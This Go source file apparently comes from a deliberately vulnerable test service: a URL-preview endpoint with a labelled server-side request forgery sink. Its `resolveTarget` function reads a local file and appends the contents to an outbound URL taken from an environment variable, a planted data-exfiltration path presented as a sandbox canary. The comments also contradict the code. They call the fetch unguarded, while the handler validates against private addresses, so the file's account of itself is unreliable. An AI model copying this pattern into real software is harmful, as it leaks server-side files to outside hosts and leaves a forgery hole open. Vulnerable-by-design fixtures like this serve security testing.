package main

import (
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
)

// canarySeedPath is the per-assessment seed a proof sandbox plants before exercising the
// service. The vulnerable outbound path reads it and carries it off-host, which is how a live
// fire observes that the SSRF sink actually executed (see resolveTarget). A static scan never
// needs it; it is load-bearing only when the service is detonated in a sandbox.
const canarySeedPath = "/tmp/tegron_canary"

// resolveTarget maps the caller-supplied target to the URL the server will fetch. There is no
// allowlist — any target is forwarded to the SSRF sink (CWE-918). The "internal" pseudo-target
// models an SSRF reaching an unintended internal collector: it resolves to the host named by
// TEGRON_OOB_URL with whatever the process can read locally appended, demonstrating that the
// unguarded fetch can exfiltrate data only the server-side request can reach. Any other target
// is forwarded verbatim — still SSRF-capable in general, but it does not touch the seed, so a
// fired beacon is attributable to the vulnerable resolution rather than to generic exfil.
func resolveTarget(name string) (string, bool) {
	if name == "internal" {
		oob := os.Getenv("TEGRON_OOB_URL")
		if oob == "" {
			return "", false
		}
		seed, err := os.ReadFile(canarySeedPath)
		if err != nil {
			return "", false
		}
		return oob + "?kind=canary&data=" + url.QueryEscape(string(seed)), true
	}
	return name, true
}

// validateResolvedURL rejects non-http(s) schemes and URLs that resolve to
// private/loopback addresses, blocking SSRF to internal hosts.
func validateResolvedURL(raw string) error {
	u, err := url.Parse(raw)
	if err != nil {
		return err
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return errors.New("scheme not allowed")
	}
	host := u.Hostname()
	ips, err := net.LookupHost(host)
	if err != nil {
		return err
	}
	for _, ipStr := range ips {
		ip := net.ParseIP(ipStr)
		if ip == nil || ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() {
			return errors.New("target resolves to a private address")
		}
	}
	return nil
}

// fetchHandler implements the URL-preview endpoint. It forwards a caller-supplied target
// directly to an outbound HTTP request with no allowlist, so a request can drive the server
// to reach an internal or unintended host. The attacker-controlled `target` query parameter
// flows through resolveTarget into http.Get — the server-side request forgery sink (CWE-918).
func fetchHandler(w http.ResponseWriter, r *http.Request) {
	requestsTotal.Inc()

	target := r.URL.Query().Get("target")
	if target == "" {
		http.Error(w, "missing target", http.StatusBadRequest)
		return
	}

	resolved, ok := resolveTarget(target)
	if !ok {
		http.Error(w, "cannot resolve target", http.StatusBadRequest)
		return
	}

	if err := validateResolvedURL(resolved); err != nil {
		http.Error(w, "target not allowed: "+err.Error(), http.StatusBadRequest)
		return
	}

	// SSRF sink: an unguarded outbound request to an attacker-influenced URL.
	resp, err := http.Get(resolved)
	if err != nil {
		http.Error(w, "fetch failed", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)

	fmt.Fprintf(w, "fetched %s -> %s\n", target, resp.Status)
}
